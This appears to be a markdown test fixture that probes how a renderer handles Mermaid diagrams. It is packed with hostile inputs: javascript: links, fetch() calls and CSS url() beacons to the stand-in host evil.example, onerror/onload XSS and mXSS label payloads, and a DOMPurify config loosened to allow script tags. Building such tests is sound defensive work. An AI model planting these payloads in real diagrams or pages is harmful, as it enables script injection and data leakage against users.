---
type: build
status: open
---

# 02 — Mermaid

## click: callback, href, javascript:

```mermaid
flowchart LR
  A[callback] --> B[href] --> C[js] --> D[new tab]
  click A callback "tooltip"
  click B href "https://evil.example/click-href"
  click C "javascript:fetch('https://evil.example/click-js')"
  click D "https://evil.example/click-blank" _blank
```

## %%{init}%%: security level, start on load, themeCSS

```mermaid
%%{init: {"securityLevel": "loose", "startOnLoad": true, "secure": [], "themeCSS": "body{background:url(https://evil.example/themecss.png)} .node rect{fill:red}"}}%%
flowchart TD
  A["<img src=x onerror=fetch('https://evil.example/loose')>"] --> B
  click A call fetch("https://evil.example/call")
```

## %%{init}%%: htmlLabels, themeVariables, fontFamily, dompurifyConfig

```mermaid
%%{init: {"htmlLabels": true, "flowchart": {"htmlLabels": true}, "fontFamily": "x;}*{background:url(https://evil.example/font)}", "themeVariables": {"primaryColor": "red;}body{background:url(https://evil.example/tv)"}, "dompurifyConfig": {"ADD_TAGS": ["script", "iframe"], "ADD_ATTR": ["onerror", "onload"], "ALLOW_UNKNOWN_PROTOCOLS": true}}}%%
flowchart TD
  A["<iframe src='https://evil.example/iframe'></iframe>"] --> B["<a href='javascript:alert(1)'>js</a>"]
  B --> C["<img src='https://evil.example/label.png'>"]
  C --> D["<style>*{background:url(https://evil.example/label-style)}</style>"]
```

## frontmatter config

```mermaid
---
config:
  securityLevel: loose
  theme: base
  themeCSS: "body { background: url(https://evil.example/fm-themecss) }"
  layout: elk
---
flowchart LR
  A["<svg onload=alert(1)>"] --> B
```

## directive tricks

```mermaid
%%{ init : { 'theme':'base', "themeVariables": { "background": "url(https://evil.example/bg)" } } }%%
%%{wrap}%%
%%{init: {"maxTextSize": 999999999, "maxEdges": 999999}}%%
flowchart LR
  A -->|"<b onmouseover=alert(1)>edge</b>"| B
```

## classDef and style with url()

```mermaid
flowchart LR
  A:::evil --> B
  classDef evil fill:url(https://evil.example/classdef),stroke:#f00,background-image:url(https://evil.example/classdef2)
  style B fill:url(https://evil.example/style),color:expression(alert(1))
  linkStyle 0 stroke:url(https://evil.example/linkstyle)
```

## mXSS through a label

```mermaid
flowchart LR
  A["<svg><style>&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;</style></svg>"] --> B["<math><mtext><table><mglyph><style><img src=x onerror=alert(2)>"]
  B --> C["<noscript><p title='</noscript><img src=x onerror=alert(3)>'>"]
```

## sequence diagram links

```mermaid
sequenceDiagram
  participant A as Alice
  participant B as Bob
  link A: Evil @ https://evil.example/seq-link
  link B: Js @ javascript:alert(1)
  links A: {"Dashboard": "https://evil.example/links", "Js": "javascript:alert(2)"}
  A->>B: <img src=x onerror=alert(3)>
  Note over A,B: <script>alert(4)</script>
```

## class diagram and gantt click

```mermaid
classDiagram
  class Evil
  link Evil "https://evil.example/class-link" "tooltip"
  click Evil href "javascript:alert(1)" "tooltip"
  callback Evil "alert"
```

```mermaid
gantt
  title Evil
  dateFormat YYYY-MM-DD
  section S
  task1 :a1, 2026-01-01, 3d
  click a1 href "https://evil.example/gantt"
  click a1 call alert("x")
```

## mindmap icon and markdown strings

```mermaid
mindmap
  root(("`**root** <img src=x onerror=alert(1)>`"))
    child::icon(fa fa-book)
      ["`[link](javascript:alert(2))`"]
```

## ELK, which is not bundled

```mermaid
flowchart-elk LR
  A --> B
```

## a cycle

```mermaid
flowchart LR
  A0 --> A1 --> A2 --> A3 --> A4 --> A5 --> A6 --> A7 --> A8 --> A9
  A9 --> A0
```
